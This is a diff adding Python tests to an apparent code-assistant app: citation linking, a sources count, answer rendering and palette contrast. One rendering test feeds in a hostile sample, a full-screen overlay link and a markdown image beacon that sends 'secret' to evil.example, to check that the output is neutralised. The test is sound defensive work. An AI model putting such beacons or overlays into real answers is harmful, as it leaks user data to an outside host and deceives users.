@@ -229,3 +229,36 @@ def test_respond_survives_unexpected_errors():
     *_, last = run(assistant)
 
     assert "Unexpected error" in last[4]
+
+
+def test_linkify_links_adjacent_citations():
+    out = linkify_citations("Use it [2][3].", SOURCES)
+
+    assert out == f"Use it [2]({citation_url(SOURCES[1], 2)})[3]({citation_url(SOURCES[2], 3)})."
+
+
+def test_sources_note_counts_only_valid_citations():
+    assert "1 of 3 retrieved" in render_sources(SOURCES, cited=[1, 0, 9], answered=True)
+
+
+def test_render_answer_neutralises_markup_and_images_but_not_code():
+    from code_assistant.app import render_answer
+
+    text = (
+        '<a style="position:fixed;inset:0" href="https://evil.example">x</a> '
+        "![beacon](https://evil.example/p.png?d=secret) [1]\n```python\nif a < b: pass\n```"
+    )
+
+    out = render_answer(text, SOURCES)
+
+    assert "<a style" not in out and "&lt;a style" in out
+    assert "![" not in out and "[beacon](https://evil.example/p.png?d=secret)" in out
+    assert "if a < b: pass" in out  # code untouched
+    assert "?source=1#" in out
+
+
+def test_every_palette_colour_meets_wcag_aa_with_its_label_ink():
+    from code_assistant.app import PALETTE, contrast
+
+    for colour in PALETTE:
+        assert contrast(f"#{colour}", label_text_color(f"#{colour}")) >= 4.5, colour
